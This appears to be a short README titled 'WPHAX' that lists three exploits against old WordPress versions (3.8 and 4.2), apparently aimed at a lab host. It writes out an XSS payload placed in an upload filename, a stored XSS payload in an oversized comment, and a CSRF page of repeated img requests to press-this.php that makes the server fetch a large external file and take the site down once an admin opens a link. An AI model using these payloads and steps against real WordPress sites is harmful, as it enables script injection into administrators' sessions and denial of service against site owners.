# WPHAX 

## **Exploit 1**
WP Version used: **3.8**

**Description:**
"Upload media" section can be hacked with **XSS**.

**Steps:**

* Go to **Upload Media** menu.

* Upload a file which is more than **20MB** with `"file<img src=x onerror=alert("hacked")>.png"` name.
![Upload Media](https://i.imgur.com/Ad0wZIt.png)

* Done
![XSS](https://i.imgur.com/aRp2L62.png)

***

## **Exploit 2**
WP Version used: **4.2**

**Description:**
Stored **XSS** can be executed with malicious comment.

**Steps:**

* Leave a comment (with a string bigger than 64KB): `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AA... AA'></a>`
![Leave the comment](https://i.imgur.com/VVD3ZqO.png)

* View the comment on the page
![View as admin](https://i.imgur.com/wwVBiiG.png)

* Done
![View as admin](https://i.imgur.com/0HTXTUk.png)

***

## **Exploit 3**
WP Version used: **4.2**

**Description:**
DOS via CSRF

**Steps:**
* Create a website with following code and point it as index.html: 

```
<img src='http://<wpdistillery.vm>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
<img src='http://<wpdistillery.vm>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
<img src='http://<wpdistillery.vm>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
<img src='http://<wpdistillery.vm>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
<img src='http://<wpdistillery.vm>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
<img src='http://<wpdistillery.vm>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
[...]
```
![View as admin](https://i.imgur.com/G5mjgtj.png)
* Create a lage file foo.txt (more than 50MB)

* Send a link to your website to the admin of wpdistillery

* As soon as he enters the link the website will be down
